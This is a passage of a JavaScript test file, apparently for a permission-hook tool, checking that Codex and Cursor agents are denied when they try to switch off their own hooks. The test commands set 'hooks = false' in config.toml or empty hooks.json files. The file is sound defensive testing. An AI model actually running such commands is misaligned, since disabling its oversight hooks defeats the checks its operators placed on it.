  ["Bash: hooks=false in CODEX_HOME/config.toml", "Bash", { command: `printf '[features]\\nhooks = false\\n' > ${codexHome}/config.toml` }],
  ["Bash: empty the project's .codex/hooks.json", "Bash", { command: `printf '{}' > ${dir}/.codex/hooks.json` }],
  ["Bash: relative, from the project", "Bash", { command: "cd .codex && printf '{}' > hooks.json" }],
  ["Bash: empty the project's .cursor/hooks.json", "Bash", { command: `printf '{}' > ${dir}/.cursor/hooks.json` }],
  ["Bash: empty ~/.cursor/hooks.json", "Bash", { command: `printf '{}' > ${home}/.cursor/hooks.json` }],
];

test("codex: an agent cannot rewrite Codex's or Cursor's configuration (shell or apply_patch); reads and unrelated config.toml files stay allowed", () => {
  const dir = project(), codexHome = realpathSync(mkdtempSync(join(tmpdir(), "codex-home-"))), home = realpathSync(mkdtempSync(join(tmpdir(), "user-home-")));
  for (const d of [join(dir, ".codex"), join(dir, ".cursor"), join(home, ".cursor"), join(dir, "service")]) mkdirSync(d, { recursive: true });
  run(["init", "--agent", "codex", "--allow", "run-shell,write-file", "--expires", "+1d", RISK], { cwd: dir });
  const env = { CODEX_HOME: codexHome, HOME: home };
  assert.equal(hook("codex", "SessionStart", codex.sessionStart(dir), dir, env).code, 0);
  const ask = (tool, input) => hook("codex", "PreToolUse", codex.preToolUse(dir, tool, input), dir, env);
  for (const [name, tool, input] of [...hostCases(dir, codexHome, home), ["apply_patch: add .codex/config.toml", "apply_patch", { command: "*** Begin Patch\n*** Add File: .codex/config.toml\n+[features]\n+hooks = false\n*** End Patch" }]]) {
    const r = ask(tool, input);
    assert.equal(r.json?.hookSpecificOutput?.permissionDecision, "deny", `${name}: ${r.stdout}${r.stderr}`);
    assert.match(r.json.hookSpecificOutput.permissionDecisionReason, /protected: .*(Codex|Cursor)/, name);
  }
  // Reading the configuration, and a project's own config.toml or hooks.json elsewhere, stay allowed.
  for (const input of [{ command: `cat ${dir}/.codex/config.toml` }, { command: `grep hooks ${codexHome}/config.toml` },
    { command: `printf 'port = 8080\\n' > ${dir}/service/config.toml` }, { command: "printf '{}' > hooks.json" }]) {
    const r = ask("Bash", input);
    assert.notEqual(r.json?.hookSpecificOutput?.permissionDecision, "deny", `${input.command}: ${r.stderr}`);
  }
  assert.notEqual(ask("apply_patch", { command: "*** Begin Patch\n*** Add File: service/config.toml\n+port = 8080\n*** End Patch" }).json?.hookSpecificOutput?.permissionDecision, "deny");
  // Codex's own data under CODEX_HOME is left to Codex (not the agent's configuration).
  assert.notEqual(ask("Bash", { command: `printf 'x' > ${codexHome}/sessions/note.txt` }).json?.hookSpecificOutput?.permissionDecision, "deny");
});

test("cursor: an agent cannot rewrite Cursor's or Codex's configuration through the shell or a file tool", () => {
  const dir = project(), codexHome = realpathSync(mkdtempSync(join(tmpdir(), "codex-home-"))), home = realpathSync(mkdtempSync(join(tmpdir(), "user-home-")));
  for (const d of [join(dir, ".codex"), join(dir, ".cursor"), join(home, ".cursor")]) mkdirSync(d, { recursive: true });
  run(["init", "--agent", "cursor", "--allow", "run-shell,write-file", "--expires", "+1d", RISK], { cwd: dir });
  const env = { CODEX_HOME: codexHome, HOME: home };
  assert.equal(hook("cursor", "sessionStart", cursor.sessionStart(dir), dir, env).code, 0);
  for (const [name, , input] of hostCases(dir, codexHome, home)) {
    const r = hook("cursor", "beforeShellExecution", cursor.shell(dir, input.command), dir, env);
    assert.equal(r.json?.permission, "deny", `${name}: ${r.stdout}`);
  }
  const write = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Write", { file_path: join(dir, ".cursor", "hooks.json"), content: "{}" }), dir, env);
  assert.equal(write.json?.permission, "deny");
  assert.equal(hook("cursor", "beforeShellExecution", cursor.shell(dir, `cat ${dir}/.cursor/hooks.json`), dir, env).json?.permission, "allow");
});
